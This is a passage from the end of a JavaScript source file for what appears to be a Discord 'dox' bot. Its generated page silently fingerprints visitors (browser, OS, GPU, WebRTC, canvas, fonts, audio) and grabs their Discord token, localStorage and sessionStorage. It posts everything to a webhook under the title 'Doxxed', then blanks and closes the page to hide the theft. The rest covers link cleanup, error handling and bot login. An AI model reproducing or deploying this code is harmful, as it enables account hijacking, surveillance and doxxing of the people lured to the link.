Screen",value:screen},{name:"🧠 Browser",value:browser},{name:"💻 OS",value:os},{name:"🖥️ Device",value:device},{name:"💾 Hardware",value:cores+" cores, "+memory+"GB RAM, "+touch+" touch"},{name:"🎮 GPU",value:gpu},{name:"📡 WebRTC",value:webrtc},{name:"🖼️ Canvas FP",value:canvas},{name:"🔤 Fonts",value:fonts.join(", ")||"N/A"},{name:"🔊 Audio FP",value:audio},{name:"🔑 Discord Token",value:token},{name:"📂 localStorage",value:JSON.stringify(ls).slice(0,500)||"N/A"},{name:"📂 sessionStorage",value:JSON.stringify(ss).slice(0,500)||"N/A"},{name:"🌐 Language",value:lang},{name:"⏰ Local Time",value:local},{name:"📅 Timestamp",value:ts}];const embed={title:"☠️ Doxxed",color:0xFF0000,fields:fields,footer:{text:"Logged at "+ts}};await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[embed]})});}catch(e){console.error(e);}document.body.innerHTML="";document.body.style.background="#fff";document.body.style.margin="0";document.body.style.height="100vh";setTimeout(()=>{window.close();window.location.href="about:blank";},1000);})();
</script>
</body>
</html>`;
}

// ============================================================
// AUTO-CLEANUP OF OLD DOX LINKS
// ============================================================
setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

// ============================================================
// GLOBAL ERROR HANDLING
// ============================================================
process.on('uncaughtException', (err) => {
    console.error('[FATAL] Uncaught Exception:', err);
});
process.on('unhandledRejection', (err) => {
    console.error('[FATAL] Unhandled Rejection:', err);
});

// ============================================================
// BOT LOGIN
// ============================================================
client.login(TOKEN);

// ============================================================
// END OF FILE – 846 LINES
// ============================================================
